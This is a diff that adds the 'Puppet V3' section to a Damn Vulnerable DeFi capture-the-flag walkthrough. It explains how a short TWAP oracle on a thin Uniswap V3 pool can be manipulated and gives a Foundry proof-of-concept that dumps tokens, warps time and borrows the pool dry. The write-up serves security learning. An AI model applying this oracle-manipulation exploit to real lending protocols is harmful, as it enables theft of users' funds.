@@ -481,3 +481,58 @@ function test_puppetV2() public checkSolvedByPlayer {
 Run `forge test --mp test/puppet-v2/PuppetV2.t.sol --isolate` to validate test
 
 ---
+
+## 14.PUPPET V3
+
+### Obejctive
+
+_from `_isSolved()`in test_
+
+1. _The attacker's exploit has to be completed in less than 115 seconds_
+2. _All tokens of the lending pool were drained_
+3. _All drained tokens from the lending pool were deposited into the recovery account_
+
+### Analysis
+
+- The pool has 100 WETH and 100 DVT tokens but it's actually low liquidity. `PuppetV3Pool` calculates the price of DVT tokens using a 10-minute Time-Weighted Average Price (TWAP). This setup makes the contract vulnerable to price manipulation attacks at a low cost. By exploiting this, an attacker could exchange make DVT tokens very cheap.
+- The oracle determines the current price based on data from the past 10 minutes. Because the TWAP period is short, making large trades within this window, such as swapping a large amount of DVT, can significantly manipulate the price.
+- Since TWAP uses delayed pricing, after manipulating the price, there's a brief time window (e.g., 110 seconds) for an attacker to take advantage of the lowered price and execute unfair loans.
+
+### POC
+
+See [test/puppet-v3/PuppetV3.t.sol](https://github.com/CanonicalJP/damn-vulnerable-defi-v4-walkthrough/blob/master/test/puppet-v3/PuppetV3.t.sol)
+
+```solidity
+import {ISwapRouter} from "@uniswap/v3-periphery/contracts/interfaces/ISwapRouter.sol";
+
+function test_puppetV3() public checkSolvedByPlayer {
+        ISwapRouter uniswapRouter = ISwapRouter(0xE592427A0AEce92De3Edee1F18E0157C05861564);
+        token.approve(address(uniswapRouter), PLAYER_INITIAL_TOKEN_BALANCE);
+        uniswapRouter.exactInputSingle(
+            ISwapRouter.ExactInputSingleParams(
+                address(token),
+                address(weth),
+                3000,
+                address(player),
+                block.timestamp,
+                PLAYER_INITIAL_TOKEN_BALANCE,
+                0,
+                0
+            )
+        );
+
+        vm.warp(block.timestamp + 114);
+
+        weth.approve(
+            address(lendingPool),
+            lendingPool.calculateDepositOfWETHRequired(LENDING_POOL_INITIAL_TOKEN_BALANCE)
+        );
+        lendingPool.borrow(LENDING_POOL_INITIAL_TOKEN_BALANCE);
+        token.transfer(recovery, LENDING_POOL_INITIAL_TOKEN_BALANCE);
+    }
+
+```
+
+Run `forge test --mp test/puppet-v3/PuppetV3.t.sol --isolate` to validate test
+
+---
